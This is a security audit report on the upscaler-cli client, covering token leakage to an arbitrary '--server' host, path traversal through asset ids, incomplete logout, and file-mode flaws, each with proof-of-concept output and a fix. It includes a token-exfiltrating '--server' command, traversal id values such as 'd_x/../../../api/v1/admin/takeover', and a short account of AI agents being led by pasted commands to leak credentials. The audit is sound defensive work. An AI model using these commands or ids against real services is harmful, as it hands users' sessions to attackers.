# Security audit — upscaler-cli 0.3.0

**Date:** 2026-08-16
**Scope:** the `upscaler-cli` client at commit `adf50f2` — all of `upscaler_cli/`
(auth, HTTP client, config/profile handling, uploads/downloads, and every CLI
command), plus packaging and CI workflows.
**Out of scope:** the Upscaler REST API and web application. Several findings
below note server-side behaviour the client depends on; those are observations
for the API team, not conclusions about the server.

**Method:** manual review of all 3,700 lines of source, with each finding
reproduced against the real code through a proof-of-concept harness before
being reported. Findings that could not be demonstrated are marked as such.
`pip-audit` was run against the dependency tree.

## Summary

Eleven findings: **1 high**, **4 medium**, **5 low**, **1 informational**.
Ten are fixed in this change; one is a product decision left open (F-11).

The codebase starts from a good place. PKCE is implemented correctly with
S256, the OAuth `state` parameter is checked, the callback server binds only to
`127.0.0.1`, redirects are not followed (so the `Authorization` header cannot
be bounced to another host), `--verbose` genuinely does not log credentials as
`SECURITY.md` claims, there is no shell execution or deserialization anywhere,
and the release workflow uses PyPI Trusted Publishing with `contents: read`.
The issues found are concentrated in two areas: **where credentials are allowed
to travel**, and **the mode files are created with**.

| ID | Severity | Finding | Status |
|----|----------|---------|--------|
| F-01 | **High** | Stored bearer token sent to any `--server` / `$UPSCALER_SERVER` host | Fixed |
| F-02 | Medium | At-rest token encryption is reversible by any local reader | Documented |
| F-03 | Medium | Asset ids can re-target the request path | Fixed |
| F-04 | Medium | `logout` leaves the refresh token and device code live | Fixed |
| F-05 | Medium | Credential files created world-readable, narrowed afterwards | Fixed |
| F-06 | Low | Profile directory mode never re-asserted | Fixed |
| F-07 | Low | Downloaded evidence files world-readable | Fixed |
| F-08 | Low | `files download --output` follows a dangling symlink | Fixed |
| F-09 | Low | Insecure transport is silent | Fixed |
| F-10 | Low | Dependency floors admit known-vulnerable `cryptography` | Fixed |
| F-11 | Info | Destructive commands self-confirm when not on a TTY | Open — by design |

---

## F-01 — Stored bearer token is sent to any server the caller names

**Severity: High.** Credential disclosure to an attacker-chosen host.

`UpscalerClient.request` loaded the token for the active profile and attached
it as `Authorization: Bearer …` to a URL built from `server_url` — resolved as
`--server` > `$UPSCALER_SERVER` > `config.json`. Nothing checked that the
target was the server that issued the token.

All three inputs are reachable without any local file access. `--server` is a
documented flag that appears in ordinary-looking commands; `$UPSCALER_SERVER`
is inherited from the environment. This CLI is explicitly designed to be driven
by AI agents from skill files and repository documentation, which makes a
pasted command a realistic delivery path — the agent runs what it is told, and
the flag looks like configuration rather than an attack.

Confirmed against the real CLI with a listener on localhost:

```
$ upscaler --server http://127.0.0.1:PORT list todos
→ attacker received: GET /api/v1/list?type=todos
→ attacker received: Authorization: Bearer SECRET-PROD-ACCESS-TOKEN
exit code 0
```

The same result via `UPSCALER_SERVER=http://…`, over plaintext HTTP, with the
command reporting success. The token is the full production session, not a
scoped one.

**Fixed.** `TokenData` already records the issuing server as `token_endpoint`.
`UpscalerClient` now compares its origin (scheme, host, port) against the
resolved `server_url` and refuses before opening a connection:

```
Refusing to send credentials for https://ai.upscaler.app to
http://attacker.example. The stored token was issued by a different server.
Use a separate profile for this server (upscaler --profile <name> login),
or run: upscaler login
```

Origin comparison normalizes case and default ports, so `https://API.Example.com`
and `https://api.example.com:443/mcp/token` still match and existing sessions
keep working. Suffix lookalikes (`ai.upscaler.app.evil.test`), scheme
downgrades, and port changes are all rejected. A token stored without a
`token_endpoint` (written by an older version) is allowed through rather than
locking the user out — anyone able to rewrite that field can already read the
token, so failing closed there would buy nothing.

Legitimately targeting another server now means logging in against it, which is
what profiles are for.

---

## F-02 — At-rest encryption is reversible by anyone who can read the files

**Severity: Medium.** Not fixable in the client without a keychain dependency;
addressed by correcting the documentation.

Tokens are encrypted with Fernet under a PBKDF2 key (480,000 iterations, which
is a well-chosen cost) derived from `hostname:username` plus a random salt. The
problem is that none of the key inputs are secret:

- the salt is stored in `.salt`, in the same directory as `tokens.enc`;
- the hostname and username are readable by any local process.

So the 480,000 iterations protect nothing against the attacker who matters. Any
process that can read the token file can re-derive the key. Demonstrated by
recovering both tokens from the on-disk files using only the salt and public
machine identity:

```
recovered_access_token:  SECRET-PROD-ACCESS-TOKEN
recovered_refresh_token: SECRET-PROD-REFRESH-TOKEN
secret material required: none beyond read access to the same directory
```

This is not worthless — it defeats casual disclosure (a token file swept into a
backup, a synced folder, or a support bundle) and makes a copied token file
useless on another machine. But the actual control keeping other local users
out is the `0600`/`0700` file modes, not the cipher. `SECURITY.md` previously
implied the encryption itself was the boundary ("encrypted with Fernet…
treat it like an SSH private key"), which sets the wrong expectation for
someone deciding whether to run this on a shared host.

**Action taken:** `SECURITY.md` now states explicitly what the encryption does
and does not protect against.

**Recommended (not implemented here — it is a dependency and UX decision):**
store tokens in the OS keychain via `keyring` (Keychain, DPAPI/Credential
Manager, Secret Service), falling back to the current scheme where no keyring
is available. That moves the key out of the readable filesystem and is the only
change that meaningfully improves this.

---

## F-03 — Asset ids can re-target the request path

**Severity: Medium.** Request forgery against the user's own API session.

Eleven call sites interpolate a caller-supplied id into a request path, e.g.
`f"/api/v1/assets/{asset_id}"` in `get.py`, `recover.py`, `hierarchy.py`,
`entry.py`, `asset.py`, and `list_cmd.py`. The ids were validated only by
prefix (`asset_id.startswith("d_")`) or, in `recover.py`, against
`^[a-z]+_.+$` — and `.` matches `/`.

httpx resolves `..` segments and splits on `?`/`#` when it parses the URL, so
the request lands somewhere the command never named. Confirmed end to end:

```
$ upscaler recover 'd_x/../../../api/v1/admin/takeover'
→ server received: POST /api/api/v1/admin/takeover/recover

$ upscaler get 'd_x/../../../api/v1/other'
→ server received: GET /api/api/v1/other
```

The request carries the user's own token, so this is not privilege escalation.
It matters because it breaks the CLI's contract about which endpoint a command
touches: ids routinely arrive from search results, documents, and LLM output,
and a `get` that silently performs a write elsewhere is a meaningful integrity
problem in an agent-driven workflow. It also lets an id smuggle query
parameters into a request that was built with none.

**Fixed.** `validate_request_path` runs in `UpscalerClient.request` — the one
place all eleven call sites funnel through — and rejects traversal segments,
empty segments, relative paths, `?`/`#`, and control characters before any
connection is opened. A reusable `validate_id` is available for commands that
want to fail earlier with a friendlier message.

---

## F-04 — `logout` leaves credentials live

**Severity: Medium.** Session outlives the logout that was supposed to end it.

Two distinct leaks:

1. `OAuthFlow.revoke` posted only the **access token**. RFC 7009 leaves it to
   the server whether revoking an access token cascades to the refresh token
   it came from. If it does not, `upscaler logout` ended with a refresh token
   still redeemable for new sessions — for hours or days — while telling the
   user "Logged out successfully."
2. `TokenStore.delete()` removes `tokens.enc`, `.salt`, and the temp file, but
   not `pending_device.json`. An interrupted `upscaler login --no-browser`
   leaves a device code on disk that is redeemable for a full token pair until
   it expires. Confirmed: after `upscaler logout`, `pending_device.json`
   survived with `device_code: SECRET-DEVICE-CODE` intact.

**Fixed.** `revoke` now sends both tokens, each with its `token_type_hint` so
the server can look it up in the right table. `logout` deletes the pending
device code as well — including on the "Not logged in" path, where no tokens
exist but a device code may.

> **For the API team:** worth confirming server-side that the revoke endpoint
> honours `token_type_hint=refresh_token`, and that redeeming a device code
> requires client authentication — `check_device_code` posts only the
> `device_code`, so anyone who obtains that value can redeem it.

---

## F-05 — Credential files created world-readable, then narrowed

**Severity: Medium.** Local disclosure window.

`TokenStore` wrote the salt and ciphertext with `write_bytes()` and called
`os.chmod(…, 0o600)` afterwards. Between those two syscalls the file carries
the ambient umask. Confirmed by instrumenting `chmod` to observe the mode at
the moment it ran:

```
mode on disk before chmod:  .salt          0o644
mode on disk before chmod:  tokens.enc.tmp 0o644
```

The same pattern appeared in `_save_pending_device`. `config.json` was written
with no mode management at all and stayed `0644` permanently.

The window is short and normally sits inside a `0700` directory — but see F-06,
which removes that containment, and the `0644` on `config.json` is not a window
at all.

**Fixed.** `write_private_bytes` / `write_private_text` open with
`O_CREAT|O_NOFOLLOW` and an explicit `0600`, so the file is never wider than
`0600` even for an instant, and an existing wide file left by an earlier
version is repaired on the next write. Used by the token store, the config
writer, the pending device code, and the default-profile file.

---

## F-06 — Profile directory mode is never re-asserted

**Severity: Low.** Removes the containment the other file modes rely on.

`ensure_profile_dir` used `mkdir(mode=0o700, exist_ok=True)`, which sets the
mode only at creation. An existing directory keeps whatever mode it has:

```
profile dir mode before save: 0o755
profile dir mode after  save: 0o755   (CLI did not re-assert)
```

A `~/.upscaler/` restored from a backup, created by an older version, or
touched by a stray `chmod` stays readable to other local users indefinitely —
and since `0600` files are only unreachable because of the directory bits, this
is what turns F-05 from theoretical into exploitable.

**Fixed.** `ensure_private_dir` re-asserts `0700` on every call, across
`~/.upscaler/`, `profiles/`, and the profile directory. Verified: a `0755` tree
is tightened to `0700` on the next write.

---

## F-07 — Downloaded evidence files are world-readable

**Severity: Low.**

`upscaler files download --output` used a plain `open(output, "wb")`, so the
file landed at the ambient umask:

```
mode: 0o644   world_readable: True
content: CONFIDENTIAL EVIDENCE FILE CONTENTS
```

These are compliance evidence files — audit artifacts, often the reason the
directory is sensitive in the first place. Defaulting them to world-readable
on a multi-user host is the wrong default even though the user can chmod
afterwards.

**Fixed.** The output file is created `0600` via `os.open`. Verified end to
end: same download now lands at `0o600`.

---

## F-08 — `--output` follows a dangling symlink

**Severity: Low.**

The overwrite guard used `Path(output).exists()`, which resolves symlinks and
therefore returns `False` for a *dangling* one. The guard passed and the
subsequent `open()` followed the link, writing the downloaded bytes through it:

```
dangling symlink followed: True
victim now contains: CONFIDENTIAL EVIDENCE FILE CONTENTS
```

Exploiting this requires an attacker who can already create files in the target
directory, so it is a narrow escalation rather than a standalone hole — but the
guard exists precisely to stop unintended writes, and it did not.

**Fixed.** The check now tests `exists() or is_symlink()`, so a link at the
destination is refused without `--force`. `write_private_bytes` additionally
passes `O_NOFOLLOW` for credential files.

---

## F-09 — Insecure transport is silent

**Severity: Low.**

`verify_ssl false` disables certificate *and* hostname verification for every
request including the OAuth token exchange, and an `http://` server URL sends
the bearer token in the clear. Both are legitimate against a local dev server;
both were completely silent. The README suggests `verify_ssl false` for
self-signed certificates without noting that it disables the protection
entirely rather than relaxing it — a setting left over from a debugging session
keeps shipping tokens unprotected with nothing on screen to say so.

**Fixed.** The CLI warns once per process on stderr (keeping `--json` stdout
parseable) when the target is plaintext HTTP or when verification is off.

**Recommended for a follow-up:** support a CA bundle path
(`config set ca_bundle /path/to/ca.pem`, passed through to httpx's `verify=`)
so self-hosted deployments can pin their own CA instead of disabling
verification. That addresses the actual need behind `verify_ssl false`.

---

## F-10 — Dependency floors admit known-vulnerable builds

**Severity: Low.**

`cryptography>=41.0` allowed the 41.x line, which carries known advisories
(NULL dereference in PKCS#12/certificate parsing, Bleichenbacher timing oracle
in RSA decryption). A fresh install resolves to a current version, but a
constrained resolve, an old lockfile, or a distro-pinned environment can
legitimately satisfy `>=41.0` with a vulnerable build.

`pip-audit` reported no advisories against the currently-resolved runtime tree
(`cryptography 50.0.0`, `httpx 0.28.1`, `click 8.4.2`, `certifi 2026.7.22`).
The two hits it produced — `pip 24.0` and `setuptools 79.0.1` — are build
tooling in the audit environment, not shipped dependencies.

**Fixed.** Floors raised to `cryptography>=42.0.4` and `httpx>=0.27`.

---

## F-11 — Destructive commands self-confirm when not on a TTY

**Severity: Informational. Open — this is a product decision, not a defect.**

`confirm_destructive` returns `True` whenever `--json` is set or stdout is not
a TTY:

```
piped stdout auto-confirms: True
json mode auto-confirms:    True
```

Every delete command — `asset`, `entry`, `todo`, `comment`, `automation` —
therefore proceeds unprompted in exactly the contexts this CLI is built for:
pipelines, CI, and AI agents. `upscaler asset delete --asset-id X | tee log`
deletes without asking.

I have **not** changed this. The auto-confirm is deliberate (a prompt would
hang automation), and requiring `--yes` would break the documented agent
workflows in `upscaler-skills` — that trade-off is the maintainers' call, not
an audit fix. Flagging it because the gap between "there is a confirmation
prompt" and "there is a confirmation prompt only for humans" is not obvious
from the code or the README.

**Options, in the order I would consider them:**

1. Document the behaviour in `SECURITY.md` and the README — done in this
   change.
2. Add an opt-in strict mode (`UPSCALER_REQUIRE_CONFIRM=1`, or
   `config set require_confirm true`) that makes `--yes` mandatory for
   destructive commands. Opt-in breaks nobody and gives cautious operators a
   real control.
3. Require `--yes` in non-interactive contexts by default, in a major version,
   with the agent skills updated in step.

Worth noting the blast radius is limited by design: deletes are soft, and
`upscaler recover <id>` restores them.

---

## What was checked and found clean

Recording the negative results, since they are part of the audit's value:

- **No injection sinks.** No `subprocess`, `os.system`, `shell=True`, `eval`,
  `exec`, `pickle`, or `yaml.load` anywhere in the package.
- **PKCE is correct.** 32 bytes from `os.urandom`, S256 challenge, verifier
  sent only in the token exchange. `state` is 32 bytes from `secrets` and is
  compared before the code is accepted.
- **The callback server is sound.** Binds `127.0.0.1` only (not `0.0.0.0`),
  shuts down in a `finally`, suppresses request logging, and HTML-escapes
  every interpolated value in the status pages — including the IdP-supplied
  `error` string. No XSS reachable there.
- **Redirects are not followed.** httpx defaults `follow_redirects=False` and
  the CLI does not override it, so a malicious server cannot 302 the
  `Authorization` header to another host.
- **`--verbose` does not leak.** It prints method, URL, request id, status, and
  byte count — no headers, no bodies. The `SECURITY.md` claim holds.
- **Profile names are validated** against `^[a-zA-Z0-9][a-zA-Z0-9._-]{0,63}$`,
  which correctly blocks path traversal and dotfile shadowing in profile
  directory names.
- **Error paths do not echo credentials.** Server error envelopes are reduced
  to a message string before display.
- **CI is well configured.** `permissions: contents: read` on both workflows,
  PyPI Trusted Publishing (no long-lived token in secrets), build and publish
  split so the build job never holds the credential, publish gated on a
  `pypi` environment, and a tag/version consistency check. The only note is
  that actions are pinned to mutable tags (`actions/checkout@v4`,
  `pypa/gh-action-pypi-publish@release/v1`) rather than commit SHAs —
  standard practice, and worth revisiting only if the threat model includes a
  compromised action publisher.
- **No secrets in the repository.** `.gitignore` covers `.env`; nothing
  credential-shaped is tracked.

## Verification

All findings were reproduced against the real code before the fix and
re-checked after. Regression tests live in `tests/test_security.py` and
`tests/test_auth/test_credential_boundaries.py` — 45 tests covering origin
binding (including suffix lookalikes, scheme downgrade, and port changes), path
injection, file modes, directory tightening, logout completeness, and the
transport warnings.

Suite: **480 passed, 8 skipped**. `flake8` and `isort` clean.
